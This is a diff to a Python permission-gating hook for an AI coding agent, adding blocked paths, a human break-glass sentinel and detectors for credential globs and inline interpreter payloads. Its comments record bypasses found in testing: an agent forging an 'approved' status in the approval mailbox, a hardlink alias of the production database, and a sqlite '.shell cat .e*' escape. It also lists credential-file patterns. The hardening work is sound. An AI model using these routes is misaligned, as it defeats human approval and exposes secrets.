@@ -76,6 +76,28 @@ BLOCKED_PATHS = [
     "/root/.bashrc",
     "/root/.bash_profile",
     "/root/.profile",
+    # Break-glass sentinel (see below). In this list so an agent cannot
+    # create it and self-authorise the downgrade it controls.
+    "/root/.dqiii8-breakglass",
+    # Governance-ESCALATE approval mailbox (2026-09-04). pre_tool_use.py
+    # sends an inline Telegram Si/No button for a governance-write ESCALATE
+    # and polls tasks/pending_approvals/<id>.json for up to 45s, treating
+    # {"status": "approved"} as a genuine human tap. Without this entry, a
+    # Claude-Code-issued Write/Edit/Bash-redirect could write that exact
+    # status directly and self-approve — confirmed live, all three routes
+    # APPROVEd before this fix. This does not affect the hook's own write of
+    # the initial "pending" file (that happens inside the running hook
+    # process itself, never through PermissionAnalyzer.evaluate()) or
+    # dqiii8_bot.py's resolution write (a separate process, never gated by
+    # this analyzer) — only a tool call issued through a session is denied.
+    "tasks/pending_approvals/",
+    # permission_request.py's own escalation mailbox (2026-09-04, same class
+    # of gap as pending_approvals above): perm_id is unpredictable (4 random
+    # bytes) but /tmp/ is a SAFE_PROJECT_DIRS fast-path, so an agent could
+    # still discover the file once created (e.g. by listing /tmp/) and
+    # overwrite it with an approved response before a human ever taps
+    # anything, or before the 10-minute window expires.
+    "/tmp/dqiii8_perm_",
 ]
 
 # ── Governance paths ────────────────────────────────────────────────────────
@@ -100,6 +122,42 @@ GOVERNANCE_PATHS = [
     ".claude/skills/",
     ".claude/settings.local.json",
 ]
+
+# ── Break-glass (2026-08-20) ────────────────────────────────────────────────
+# CLAUDE.md and .claude/settings.json are hard-DENY above, with no in-band
+# operator override -- so a settings.json that breaks the session cannot be
+# repaired from inside a session at all. The sentinel is the out-of-band
+# authorisation: a human creates it in a shell (an agent cannot -- the sentinel
+# path is itself in BLOCKED_PATHS), which downgrades those two tokens from DENY
+# to ESCALATE on every route (Edit/Write, MCP, Bash, glob probes). ESCALATE is
+# still blocked on the wire and still routed to the operator; it never becomes
+# an auto-approve, and no other BLOCKED_PATHS token is affected.
+#
+# Resolved through a predicate rather than by mutating GOVERNANCE_PATHS, so a
+# test can force either state (monkeypatch _BREAKGLASS_CACHE). The mutating
+# version made the whole suite depend on a file in /root and left the ARMED
+# state untestable.
+BREAKGLASS_SENTINEL = Path("/root/.dqiii8-breakglass")
+BREAKGLASS_DOWNGRADE = ("CLAUDE.md", ".claude/settings.json")
+
+_BREAKGLASS_CACHE: bool | None = None
+
+
+def _breakglass_active() -> bool:
+    """Sentinel state, resolved once per process (hooks are one-shot)."""
+    global _BREAKGLASS_CACHE
+    if _BREAKGLASS_CACHE is None:
+        try:
+            _BREAKGLASS_CACHE = BREAKGLASS_SENTINEL.is_file()
+        except OSError:
+            _BREAKGLASS_CACHE = False  # fail closed: tokens stay hard-DENY
+    return _BREAKGLASS_CACHE
+
+
+def _downgraded() -> tuple[str, ...]:
+    """BLOCKED_PATHS tokens currently downgraded to ESCALATE."""
+    return BREAKGLASS_DOWNGRADE if _breakglass_active() else ()
+
 
 # Paths where even READ is dangerous (credential exfiltration risk).
 # Literal fast-path tokens only; the authoritative matcher is _credential_hit()
@@ -138,11 +196,11 @@ _CREDENTIAL_TEMPLATE_RE = re.compile(r"\.(?:example|sample|template|dist)$", re.
 # alembic/022_wallet_pass_secrets.py, SECRETPOWER.yaml) stay readable.
 _CREDENTIAL_BASENAME_RE = re.compile(
     r"^(?:"
-    r".*\.env(?:\..+)?"          # .env, .env.local, prod.env, config/app.env
-    r"|\.credentials\.json"      # OAuth credential store
-    r"|id_rsa.*|id_ed25519.*"    # private keys (and their .pub siblings)
-    r"|\.secrets"                # dotfile secret store
-    r"|.*secrets?\.json"         # client_secret.json, youtube_client_secret.json
+    r".*\.env(?:\..+)?"  # .env, .env.local, prod.env, config/app.env
+    r"|\.credentials\.json"  # OAuth credential store
+    r"|id_rsa.*|id_ed25519.*"  # private keys (and their .pub siblings)
+    r"|\.secrets"  # dotfile secret store
+    r"|.*secrets?\.json"  # client_secret.json, youtube_client_secret.json
     r"|.+\.(?:pem|key|p12|pfx)"  # X.509 / PKCS#12 key material
     r")$",
     re.IGNORECASE,
@@ -187,17 +245,19 @@ _MCP_FS_READONLY_SUFFIXES = {
 # plural key that this tuple never matched, so a multi-file credential read
 # via that one tool was invisible to every path-based check below.
 _MCP_PATH_KEYS = (
-    "file_path", "path", "source", "destination", "target", "dest",
-    "paths", "file_paths",
+    "file_path",
+    "path",
+    "source",
+    "destination",
+    "target",
+    "dest",
+    "paths",
+    "file_paths",
 )
 
 # SQLite statements that name a filesystem path directly.
-_SQL_ATTACH_RE = re.compile(
-    r"""\bATTACH\s+(?:DATABASE\s+)?['"]([^'"]+)['"]""", re.IGNORECASE
-)
-_SQL_VACUUM_INTO_RE = re.compile(
-    r"""\bVACUUM\s+INTO\s+['"]([^'"]+)['"]""", re.IGNORECASE
-)
+_SQL_ATTACH_RE = re.compile(r"""\bATTACH\s+(?:DATABASE\s+)?['"]([^'"]+)['"]""", re.IGNORECASE)
+_SQL_VACUUM_INTO_RE = re.compile(r"""\bVACUUM\s+INTO\s+['"]([^'"]+)['"]""", re.IGNORECASE)
 # Best-effort catch-all for a path-shaped string literal anywhere in the query
 # (readfile()/writefile() extensions, .import targets, or an ATTACH spelled in
 # a form the two patterns above miss). Deliberately a heuristic, not a parser:
@@ -207,6 +267,38 @@ _SQL_PATHISH_RE = re.compile(
     r"""['"]\s*((?:[^'"\s]*/[^'"]*)|(?:[^'"\s/]+\.(?:db|sqlite|sqlite3|sql|env|json|md|py|sh|key|pem)))\s*['"]""",
     re.IGNORECASE,
 )
+
+
+_PATHISH_KEY_TOKENS = ("path", "dest", "target", "file")
+
+
+def _path_like_values(obj) -> list[str]:
+    """Values found under a path-shaped key, anywhere in a nested dict/list.
+
+    Fallback candidate source for MCP tool families whose write target can
+    appear under an unpredictable or renamed key (see mcp__github__ write-
+    shaped handling in _candidate_paths) -- an unrecognized top-level key
+    (e.g. "repo_path") or a renamed array (e.g. "files" -> "updates") both
+    still carry the value under a key whose *name* is path-shaped, so this
+    recurses unconditionally but only extracts leaves at a path-shaped key.
+    Deliberately NOT a blanket string-leaf scan: free-text fields (PR body,
+    commit message) can legitimately mention a sensitive-looking substring
+    without being a write target, and would false-positive under that.
+    """
+    out: list[str] = []
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            kl = k.lower()
+            if kl in _MCP_PATH_KEYS or any(tok in kl for tok in _PATHISH_KEY_TOKENS):
+                if isinstance(v, str) and v:
+                    out.append(v)
+                elif isinstance(v, (list, tuple)):
+                    out.extend(x for x in v if isinstance(x, str) and x)
+            out.extend(_path_like_values(v))
+    elif isinstance(obj, (list, tuple)):
+        for v in obj:
+            out.extend(_path_like_values(v))
+    return out
 
 
 def _sql_candidate_paths(sql: str) -> list[str]:
@@ -265,9 +357,7 @@ def _candidate_paths(tool: str, tool_input: dict) -> list[str]:
         # mcp__filesystem__ only. Read-shaped suffixes (get_*/list_*/search_*)
         # are exempt; anything else fails closed, same policy as the
         # filesystem server above (settings.json allows the whole mcp__* glob).
-        if tool.startswith("mcp__github__") and not suffix.startswith(
-            ("get_", "list_", "search_")
-        ):
+        if tool.startswith("mcp__github__") and not suffix.startswith(("get_", "list_", "search_")):
             for key in _MCP_PATH_KEYS:
                 val = inp.get(key)
                 if isinstance(val, str) and val:
@@ -283,6 +373,10 @@ def _candidate_paths(tool: str, tool_input: dict) -> list[str]:
                         p = f.get("path")
                         if isinstance(p, str) and p:
                             paths.append(p)
+            # 2026-08-21: fallback for any key name/shape not covered above
+            # (unrecognized top-level key, or "files" renamed by a future
+            # API/wrapper) -- fail closed rather than trust the fixed list.
+            paths.extend(_path_like_values(inp))
         # Any MCP tool that takes SQL is a filesystem actor via ATTACH/VACUUM,
         # regardless of which server exposes it.
         for key in ("sql", "query", "statement"):
@@ -349,6 +443,60 @@ def _path_match_candidates(path: str) -> list[str]:
     return sorted(candidates)
 
 
+def _bounded_token_in(token: str, text: str) -> bool:
+    """Same word-boundary containment test `_mentions_protected_path()` uses
+    for raw Bash command text, reused here for path candidates.
+
+    `_path_match_candidates()` includes the *entire* raw/collapsed Bash
+    command as one candidate (`_bash_resolved_write_targets`'s "cheap, catches
+    the common case" entry) alongside genuinely resolved file paths. A plain
+    substring `in` check against that blob false-positives on any short
+    BLOCKED_PATHS/GOVERNANCE_PATHS token that happens to appear inside
+    unrelated code — e.g. `.env` inside `os.environ` — denying a benign
+    read with no write anywhere in the command (found 2026-09-02 auditing
+    session tooling). Genuine resolved paths still match correctly: a path
+    separator or string boundary always brackets a real path token, so the
+    boundary requirement never rejects a true hit.
+    """
+    i = text.find(token)
+    while i != -1:
+        end = i + len(token)
+        before_ok = i == 0 or not _PATH_TOKEN_WORD_RE.match(text[i - 1])
+        after_ok = (
+            not _PATH_TOKEN_WORD_RE.match(token[-1])
+            or end >= len(text)
+            or not _PATH_TOKEN_WORD_RE.match(text[end])
+        )
+        if before_ok and after_ok:
+            return True
+        i = text.find(token, i + 1)
+    return False
+
+
+def _same_file(path_a: str, path_b: str) -> bool:
+    """True if both paths resolve to the same underlying file. Raises
+    OSError if either can't be stat()ed — callers decide fail-open/closed.
+
+    os.path.realpath alone only resolves symlink chains: a *hardlink* to
+    the production DB has no symlink to resolve, so two different
+    hardlinked paths to the identical file compare unequal under plain
+    realpath string equality. That let `_blocked_path_hit`'s dqiii8.db
+    special case and `_sql_table_check_scoped_to_production` both be
+    defeated by `os.link(DB_PATH, /tmp/alias.db)` followed by a mutation
+    issued against /tmp/alias.db — confirmed live 2026-09-04 with a real
+    hardlink to the production DB: the scoped check evaluated the SQL as
+    APPROVE even though the hardlink is the exact same inode as DB_PATH.
+    st_dev+st_ino identity is hardlink-proof; the realpath fallback below
+    only ever widens protection (never narrows it) for filesystems where
+    inode numbers aren't meaningful.
+    """
+    st_a = os.stat(path_a)
+    st_b = os.stat(path_b)
+    if (st_a.st_dev, st_a.st_ino) == (st_b.st_dev, st_b.st_ino):
+        return True
+    return os.path.realpath(path_a) == os.path.realpath(path_b)
+
+
 def _blocked_path_hit(path: str) -> str | None:
     """The BLOCKED_PATHS token a path matches, ignoring governance-only tokens.
 
@@ -357,26 +505,82 @@ def _blocked_path_hit(path: str) -> str | None:
     *also* matches a genuine deny token (e.g. `.claude/rules/secrets.md` hitting
     "secrets") still denies — DENY wins whenever the two lists disagree.
     """
+    down = _downgraded()
     for cand in _path_match_candidates(path):
         for blocked in BLOCKED_PATHS:
-            if blocked in GOVERNANCE_PATHS:
+            if blocked in GOVERNANCE_PATHS or blocked in down:
                 continue
-            if blocked in cand:
+            if blocked == "dqiii8.db":
+                # Scoped to the real production DB file (2026-09-04 false
+                # positive): a bare-basename token otherwise matches ANY path
+                # ending in "dqiii8.db", including an isolated sandbox/test
+                # DB of the same name with no relation to production.
+                try:
+                    if _same_file(cand, str(DB_PATH)):
+                        return blocked
+                except OSError:
+                    pass
+                continue
+            if blocked == "/tmp/dqiii8_perm_":
+                # Prefix match, not _bounded_token_in: the token ends in '_'
+                # (a word char) immediately followed by more word chars (the
+                # hex perm_id) in every real filename, so the ordinary word-
+                # boundary check never fires here (2026-09-04, found live).
+                if cand.startswith(blocked):
+                    return blocked
+                continue
+            if _bounded_token_in(blocked, cand):
                 return blocked
     return None
 
 
 def _governance_path_hit(path: str) -> str | None:
     """The GOVERNANCE_PATHS token a path matches, or None."""
-    for cand in _path_match_candidates(path):
+    candidates = _path_match_candidates(path)
+    for cand in candidates:
         normalized = cand.replace("\\", "/")
-        for gov in GOVERNANCE_PATHS:
-            if gov in normalized:
+        for gov in (*GOVERNANCE_PATHS, *_downgraded()):
+            if _bounded_token_in(gov, normalized):
                 return gov
+    # 2026-08-21: a write/extract *target directory* that IS the governance
+    # root itself (not a file merely nested under it -- .claude/commands/
+    # checkpoint.md must stay APPROVE) matched none of the named-subdir
+    # tokens above and slipped through, e.g. `unzip -d .claude/ archive.zip`.
+    # Equality-based, not substring, so it never fires for a nested path.
+    for cand in candidates:
+        stripped = cand.replace("\\", "/").rstrip("/")
+        if stripped == ".claude" or stripped.endswith("/.claude"):
+            return ".claude/"
     return None
+
 
 # Shell metacharacters used to split a Bash command into path-like tokens.
 _BASH_TOKEN_SPLIT_RE = re.compile(r"""[\s'"();|&<>=`,]+""")
+
+# 2026-08-20 (A2): flags cuyo argumento es un patron de EXCLUSION. Ver
+# _is_glob_exclusion_argument.
+_EXCLUSION_FLAGS = frozenset({"--exclude", "--exclude-dir", "--exclude-from", "--ignore"})
+_PATH_PREDICATES = frozenset({"-path", "-ipath", "-wholename", "-iwholename", "-name", "-iname"})
+_NEGATORS = frozenset({"-not", "!"})
+
+
+def _is_glob_exclusion_argument(prev: list[str]) -> bool:
+    """True si el token es el patron de una exclusion, no un operando leido.
+
+    `find . -name "*.tmp" -not -path "./.git/*"` se denegaba como
+    bash_credential_glob: el basename de `./.git/*` es `*`, que casa con
+    `id_rsa`. Pero ese patron EXCLUYE — solo puede quitar rutas de lo que el
+    comando toca, nunca anadir la credencial.
+
+    Deliberadamente NO cubre inclusiones sueltas (`-name` sin negar): ahi el
+    patron si designa lo que el comando alcanza, y `find . -name ".e*" -exec cat
+    {} +` tiene que seguir denegando.
+    """
+    if not prev:
+        return False
+    if prev[-1] in _EXCLUSION_FLAGS:
+        return True
+    return len(prev) >= 2 and prev[-1] in _PATH_PREDICATES and prev[-2] in _NEGATORS
 
 
 def _credential_hit(path: str) -> str | None:
@@ -444,10 +648,21 @@ def _glob_filter_hit(spec: str) -> str | None:
 # pattern), so credential detection for a glob-shaped token instead asks the
 # reverse question: does this pattern match a name we know is sensitive?
 _CREDENTIAL_GLOB_PROBES = (
-    ".env", ".env.local", ".env.production", ".credentials.json",
-    "id_rsa", "id_ed25519", ".secrets", "secrets.json",
-    "client_secret.json", "server.pem", "server.key", "cert.p12", "cert.pfx",
+    ".env",
+    ".env.local",
+    ".env.production",
+    ".credentials.json",
+    "id_rsa",
+    "id_ed25519",
+    ".secrets",
+    "secrets.json",
+    "client_secret.json",
+    "server.pem",
+    "server.key",
+    "cert.p12",
+    "cert.pfx",
 )
+
 
 def _credential_glob_hit(token: str) -> str | None:
     """Return the sensitive basename a Bash glob TOKEN would expand to, or None.
@@ -462,6 +677,296 @@ def _credential_glob_hit(token: str) -> str | None:
         if fnmatch.fnmatchcase(probe, base):
             return probe
     return None
+
+
+# 2026-08-20 (A4). Ver _sql_literal_spans.
+_DB_CLIENT_RE = re.compile(r"(?:^|[;&|\n]\s*)\s*(?:sqlite3|psql|mysql|mariadb|duckdb)\b")
+_SQL_STATEMENT_RE = re.compile(
+    r"^\s*(?:SELECT|WITH|PRAGMA|EXPLAIN|INSERT|UPDATE|DELETE|CREATE|DROP|ALTER"
+    r"|VACUUM|ATTACH|BEGIN|COMMIT|REPLACE)\b",
+    re.IGNORECASE,
+)
+_QUOTED_SPAN_RE = re.compile(r"'([^']*)'|\"([^\"]*)\"")
+# Un dot-command de sqlite3 al principio de una sentencia. `.shell`/`.system`
+# lanzan un proceso y `.import`/`.output` tocan ficheros, asi que el argumento
+# deja de ser dato inerte: medido en vivo, `"SELECT 1; .shell cat .e*"` pasaba
+# de DENY a APPROVE con la primera version de este parche.
+_SQL_DOT_COMMAND_RE = re.compile(r"(?:^|[;\n])\s*\.")
+
+
+def _sql_literal_spans(cmd: str) -> list[tuple[int, int]]:
+    """Tramos de CMD que son una sentencia SQL entrecomillada, o lista vacia.
+
+    Se exige que el comando sea un cliente de DB: un metacaracter citado dentro
+    de `python3 -c "..."` SI lo expande el programa, y ese caso debe seguir
+    denegando aunque el texto contenga verbos SQL. Por la misma razon se
+    descarta cualquier literal con un dot-command.
+    """
+    if not _DB_CLIENT_RE.search(cmd):
+        return []
+    spans = []
+    for m in _QUOTED_SPAN_RE.finditer(cmd):
+        body = m.group(1) if m.group(1) is not None else m.group(2)
+        if _SQL_STATEMENT_RE.match(body) and not _SQL_DOT_COMMAND_RE.search(body):
+            spans.append(m.span())
+    return spans
+
+
+def _globs_are_sql_only(cmd: str) -> bool:
+    """True si TODO glob del comando vive dentro de un literal SQL."""
+    spans = _sql_literal_spans(cmd)
+    if not spans:
+        return False
+    return all(
+        any(start <= m.start() and m.end() <= end for start, end in spans)
+        for m in _GLOB_WILDCARD_RE.finditer(cmd)
+    )
+
+
+def _mask_sql_literals(cmd: str) -> str:
+    """CMD con el interior de cada literal SQL neutralizado, misma longitud.
+
+    Deja las comillas en su sitio y sustituye el contenido, de modo que
+    `WHERE id > 1` deja de parecer una redireccion sin mover ningun offset ni
+    ocultar nada que este FUERA del literal.
+    """
+    spans = _sql_literal_spans(cmd)
+    if not spans:
+        return cmd
+    out = list(cmd)
+    for start, end in spans:
+        for i in range(start + 1, end - 1):
+            out[i] = "x"
+    return "".join(out)
+
+
+# 2026-08-20 (A5). Ver _mask_quotes_for_readonly.
+_READONLY_COMMANDS = frozenset(
+    {
+        "grep",
+        "egrep",
+        "fgrep",
+        "rg",
+        "ag",
+        "cat",
+        "head",
+        "tail",
+        "wc",
+        "sort",
+        "uniq",
+        "cut",
+        "nl",
+        "diff",
+        "comm",
+        "rev",
+        "strings",
+        "basename",
+        "dirname",
+    }
+)
+_FIRST_WORD_RE = re.compile(r"^\s*([\w./-]+)")
+# Encadenar invalida la afirmacion: solo se analiza un comando suelto.
+_CHAINING_RE = re.compile(r"&&|\|\||[;|\n]")
+
+
+def _has_unquoted_chaining(cmd: str) -> bool:
+    """¿Hay un separador de comandos FUERA de comillas?
+
+    Mirarlo sobre el texto crudo seria el mismo error de rol que este parche
+    corrige: el `|` de `grep 'x >| y' f` esta dentro del patron, no separa nada.
+    Si las comillas no casan no hay spans y se mira todo -> conservador.
+    """
+    spans = [m.span() for m in _QUOTED_SPAN_RE.finditer(cmd)]
+    return any(
+        not any(start <= m.start() and m.end() <= end for start, end in spans)
+        for m in _CHAINING_RE.finditer(cmd)
+    )
+
+
+def _mask_quotes_for_readonly(cmd: str) -> str:
+    """CMD con el interior de sus literales neutralizado si el ejecutable no escribe.
+
+    Solo para decidir SI el comando escribe. La deteccion de credenciales y de
+    rutas sigue leyendo el comando original: esto no amplia lo que se puede
+    tocar, solo deja de inventarse una redireccion donde hay un patron de
+    busqueda.
+    """
+    if _OPAQUE_SHELL_RE.search(cmd) or _has_unquoted_chaining(cmd):
+        return cmd
+    head = _FIRST_WORD_RE.match(cmd)
+    if not head or head.group(1).rsplit("/", 1)[-1] not in _READONLY_COMMANDS:
+        return cmd
+    spans = [m.span() for m in _QUOTED_SPAN_RE.finditer(cmd)]
+    if not spans:
+        return cmd
+    out = list(cmd)
+    for start, end in spans:
+        for i in range(start + 1, end - 1):
+            out[i] = "x"
+    return "".join(out)
+
+
+# 2026-08-20 (A6). Ver _python_payload_verdict.
+_PY_CMD_RE = re.compile(r"(?:^|[\s;&|])(?:/[\w./-]*/)?python[\d.]*(?:\s|$)")
+_PY_DASH_C_RE = re.compile(
+    r"(?:^|[\s;&|])(?:/[\w./-]*/)?python[\d.]*\s+(?:-\w+\s+)*-c\s+(['\"])(.*?)\1",
+    re.S,
+)
+# Heredoc con terminador en su propia linea. Sin terminador no hay span, y sin
+# span no se afirma nada: la Fase B cayo por dar por buena una extraccion parcial.
+_PY_HEREDOC_RE = re.compile(r"<<-?\s*(['\"]?)(\w+)\1\r?\n(.*?)\r?\n\2(?:\s|$)", re.S)
+
+
+def _python_payloads(cmd: str) -> list[tuple[int, int]]:
+    """Tramos de CMD que son codigo Python entregado a un interprete."""
+    spans = [m.span(2) for m in _PY_DASH_C_RE.finditer(cmd)]
+    if _PY_CMD_RE.search(cmd):
+        spans.extend(m.span(3) for m in _PY_HEREDOC_RE.finditer(cmd))
+    return spans
+
+
+def _python_payload_verdict(cmd: str, spans: list[tuple[int, int]]) -> str:
+    """'inert' | 'active' | 'unknown' para el codigo de SPANS.
+
+    Allowlist sobre el arbol, no sobre el texto: solo `print` de constantes. Un
+    Call cuyo `func` no sea exactamente `Name('print')` basta para marcarlo
+    activo, asi que `getattr(...)`, `breakpoint()`, `vars()` y `'x'.decode()`
+    caen por construccion, no por estar en una lista.
+    """
+    import ast
+
+    permitidos = (
+        ast.Module,
+        ast.Expr,
+        ast.Constant,
+        ast.JoinedStr,
+        ast.FormattedValue,
+        ast.Call,
+        ast.Name,
+        ast.Load,
+        ast.Pass,
+        ast.BinOp,
+        ast.Add,
+        ast.Tuple,
+        ast.List,
+        ast.keyword,
+    )
+    for start, end in spans:
+        try:
+            arbol = ast.parse(cmd[start:end])
+        except (SyntaxError, ValueError):
+            return "unknown"
+        for nodo in ast.walk(arbol):
+            if not isinstance(nodo, permitidos):
+                return "active"
+            if isinstance(nodo, ast.Call) and not (
+                isinstance(nodo.func, ast.Name) and nodo.func.id == "print"
+            ):
+                return "active"
+    return "inert"
+
+
+def _mask_inert_python(cmd: str) -> str:
+    """CMD con el codigo Python neutralizado si TODO el es demostrablemente inerte."""
+    spans = _python_payloads(cmd)
+    if not spans or _python_payload_verdict(cmd, spans) != "inert":
+        return cmd
+    out = list(cmd)
+    for start, end in spans:
+        for i in range(start, end):
+            out[i] = "x"
+    return "".join(out)
+
+
+_PATH_TOKEN_WORD_RE = re.compile(r"[A-Za-z0-9_]")
+
+
+# 2026-08-21 (A7). Ver _js_payload_verdict.
+_JS_CMD_RE = re.compile(r"(?:^|[\s;&|])(?:/[\w./-]*/)?node(?:\s|$)")
+# El delimitador se trata por separado a proposito. Con `(['\"])(.*?)\1` el
+# payload `"console.log(\"x\")"` se cortaba en la primera comilla ESCAPADA, y
+# medio `console.log(` no casa la allowlist: un `console.log` legitimo salia
+# escalado. Dentro de comilla simple el shell no interpreta escapes; dentro de
+# doble, si.
+_JS_EVAL_RE = re.compile(
+    r"(?:^|[\s;&|])(?:/[\w./-]*/)?node\s+(?:-\w+\s+)*"
+    r"(?:-e|--eval|-p|--print)\s+(?:'([^']*)'|\"((?:[^\"\\]|\\.)*)\")",
+    re.S,
+)
+# Mismo criterio que en A6: sin terminador no hay span, y sin span no se afirma
+# nada.
+_JS_HEREDOC_RE = re.compile(r"<<-?\s*(['\"]?)(\w+)\1\r?\n(.*?)\r?\n\2(?:\s|$)", re.S)
+
+# ALLOWLIST anclada al payload ENTERO: uno o mas `console.log` de literales de
+# cadena, nada mas. No admite escapes dentro del literal — un `\` podria ocultar
+# la comilla de cierre y cambiar como parsea node lo que viene detras.
+_JS_INERT_RE = re.compile(
+    r"^\s*(?:console\.log\(\s*(?:'[^'\\]*'|\"[^\"\\]*\")"
+    r"(?:\s*,\s*(?:'[^'\\]*'|\"[^\"\\]*\"))*\s*\)\s*;?\s*)+$"
+)
+
+
+def _js_payloads(cmd: str) -> list[tuple[int, int]]:
+    """Tramos de CMD que son JavaScript entregado a node."""
+    spans = []
+    for m in _JS_EVAL_RE.finditer(cmd):
+        spans.append(m.span(1) if m.group(1) is not None else m.span(2))
+    if _JS_CMD_RE.search(cmd):
+        spans.extend(m.span(3) for m in _JS_HEREDOC_RE.finditer(cmd))
+    return spans
+
+
+def _js_payload_verdict(cmd: str, spans: list[tuple[int, int]]) -> str:
+    """'inert' | 'active' para el JS de SPANS.
+
+    No hay tercer valor: sin parser, "no se pudo analizar" y "no case la
+    allowlist" son la misma cosa, y ambas son activo. En A6 el 'unknown' existe
+    porque `ast.parse` distingue de verdad esos dos casos.
+
+    Solo se deshace `\"`, que es lo que el shell ya resolvio antes de que node
+    vea el texto. Cualquier otra barra sobrevive, y la allowlist no admite
+    barras dentro de los literales, asi que lo raro cae del lado activo.
+    """
+    for start, end in spans:
+        if not _JS_INERT_RE.match(cmd[start:end].replace('\\"', '"')):
+            return "active"
+    return "inert"
+
+
+def _interpreter_code_is_active(cmd: str) -> bool:
+    """¿Entrega CMD a un interprete codigo que no es demostrablemente inerte?"""
+    py = _python_payloads(cmd)
+    if py and _python_payload_verdict(cmd, py) == "active":
+        return True
+    js = _js_payloads(cmd)
+    return bool(js) and _js_payload_verdict(cmd, js) == "active"
+
+
+def _mentions_protected_path(cmd: str) -> bool:
+    """¿Nombra el comando algun blocked/governance path, como PATH y no como fragmento?
+
+    El substring pelado no vale: `.env` vive dentro de `os.environ`, y con el
+    se escalaba toda lectura de entorno. Se exige borde de token por delante
+    siempre, y por detras solo si el token acaba en caracter de palabra —
+    `.claude/hooks/` va seguido del nombre del fichero por construccion.
+
+    Grueso a proposito: solo decide si se pide revision humana, nunca si se
+    deniega, asi que un fallo cuesta friccion o el comportamiento previo a A6,
+    nunca correccion.
+    """
+
+    def _borde(ch: str) -> bool:
+        return not ch or not _PATH_TOKEN_WORD_RE.match(ch)
+
+    for token in (*BLOCKED_PATHS, *GOVERNANCE_PATHS):
+        mira_detras = bool(_PATH_TOKEN_WORD_RE.match(token[-1]))
+        i = cmd.find(token)
+        while i != -1:
+            fin = i + len(token)
+            if _borde(cmd[i - 1] if i else "") and (not mira_detras or _borde(cmd[fin : fin + 1])):
+                return True
+            i = cmd.find(token, i + 1)
+    return False
 
 
 def _collapse_adjacent_quotes(cmd: str) -> str:
@@ -509,15 +1014,14 @@ _OBFUSCATED_DECODE_PIPE_RE = re.compile(
 # copy: that helper's `\(.)-> \1` pass runs re.sub repeatedly and would mangle
 # `\xNN` into a single stray character before this ever sees it.
 _ANSI_C_QUOTE_RE = re.compile(r"\$'((?:[^'\\]|\\.)*)'")
-_ANSI_C_ESCAPE_RE = re.compile(
-    r"\\x([0-9A-Fa-f]{1,2})|\\u([0-9A-Fa-f]{4})|\\([0-7]{1,3})|\\e|\\n"
-)
+_ANSI_C_ESCAPE_RE = re.compile(r"\\x([0-9A-Fa-f]{1,2})|\\u([0-9A-Fa-f]{4})|\\([0-7]{1,3})|\\e|\\n")
 
 
 def _decode_ansi_c_escapes(payload: str) -> str:
     """Best-effort decode of the escape forms Bash's $'...' honors that a
     hex/octal/obfuscated-command payload would actually use: \\xNN, \\NNN
     (octal), \\uNNNN, \\e, \\n. [S5]"""
+
     def _sub(m: re.Match) -> str:
         if m.group(1) is not None:
             return chr(int(m.group(1), 16))
@@ -547,9 +1051,7 @@ def _ansi_c_decoded_cmd(raw_cmd: str) -> str | None:
 # `cd`, a subshell `(cd … && …)`, a newline separator, and the `cd` inside
 # `bash -c '…'`. The lookbehind keeps 'abcd foo' / '/usr/bin/cd' from
 # matching while allowing '(', quote, ';', '&&' and newline to precede it.
-_CD_CHDIR_RE = re.compile(
-    r"""(?<![\w./-])(?:cd|pushd)\s+("[^"]*"|'[^']*'|[^\s;&|)]+)"""
-)
+_CD_CHDIR_RE = re.compile(r"""(?<![\w./-])(?:cd|pushd)\s+("[^"]*"|'[^']*'|[^\s;&|)]+)""")
 
 
 def _bash_effective_cwd(cmd: str) -> str:
@@ -600,9 +1102,7 @@ _UNZIP_DEST_RE = re.compile(
 #   cpio        -D/--directory   — extract mode, e.g. `cpio -idmv -D <dir>`
 #   pip install --target/-t      — writes arbitrary package files (including
 #                                  .py that later gets imported) into <dir>
-_SEVENZIP_DEST_RE = re.compile(
-    r"""\b7z[ar]?\b[^|;&\n]*?\s-o("[^"]*"|'[^']*'|[^\s;&|]+)"""
-)
+_SEVENZIP_DEST_RE = re.compile(r"""\b7z[ar]?\b[^|;&\n]*?\s-o("[^"]*"|'[^']*'|[^\s;&|]+)""")
 _BSDTAR_DEST_RE = re.compile(
     r"""\bbsdtar\b[^|;&\n]*?\s(?:-C|--directory)(?:=|\s+)("[^"]*"|'[^']*'|[^\s;&|]+)"""
 )
@@ -639,9 +1139,7 @@ def _archive_dest_dirs(cmd: str) -> list[str]:
             tgt = m.group(1).strip().strip("'\"")
             if not tgt or tgt.startswith("-"):
                 continue
-            resolved = os.path.normpath(
-                tgt if tgt.startswith("/") else os.path.join(cwd, tgt)
-            )
+            resolved = os.path.normpath(tgt if tgt.startswith("/") else os.path.join(cwd, tgt))
             out.append(resolved)
             out.append(resolved.rstrip("/") + "/")
     return out
@@ -653,23 +1151,16 @@ def _archive_dest_dirs(cmd: str) -> list[str]:
 # BLOCKED/GOVERNANCE token ever appeared. Static text substitution of
 # assignments found earlier in the same command string — nothing is executed,
 # no eval, no environment lookup.
-_SHELL_ASSIGN_RE = re.compile(
-    r"""(?:^|[\s;&|(])([A-Za-z_]\w*)=("[^"]*"|'[^']*'|[^\s;&|)<>]*)"""
-)
+_SHELL_ASSIGN_RE = re.compile(r"""(?:^|[\s;&|(])([A-Za-z_]\w*)=("[^"]*"|'[^']*'|[^\s;&|)<>]*)""")
 _SHELL_VAR_REF_RE = re.compile(r"\$\{([A-Za-z_]\w*)\}|\$([A-Za-z_]\w*)")
 
 
 def _shell_assignments(cmd: str) -> dict[str, str]:
-    return {
-        m.group(1): m.group(2).strip("'\"")
-        for m in _SHELL_ASSIGN_RE.finditer(cmd)
-    }
+    return {m.group(1): m.group(2).strip("'\"") for m in _SHELL_ASSIGN_RE.finditer(cmd)}
 
 
 def _expand_shell_vars(token: str, assigns: dict[str, str]) -> str:
-    return _SHELL_VAR_REF_RE.sub(
-        lambda m: assigns.get(m.group(1) or m.group(2), m.group(0)), token
-    )
+    return _SHELL_VAR_REF_RE.sub(lambda m: assigns.get(m.group(1) or m.group(2), m.group(0)), token)
 
 
 def _protected_paths_matching(pattern: str) -> list[str]:
@@ -693,22 +1184,134 @@ def _protected_paths_matching(pattern: str) -> list[str]:
     return hits
 
 
-def _bash_resolved_write_targets(cmd: str) -> list[str]:
+# 2026-08-20 (A3b). Ver _copy_family_destinations. `mv` y `rsync` quedan FUERA a
+# proposito: `mv` borra el origen y `rsync --remove-source-files` tambien, asi
+# que en ellos el origen si es una escritura y no puede dejar de atribuirse.
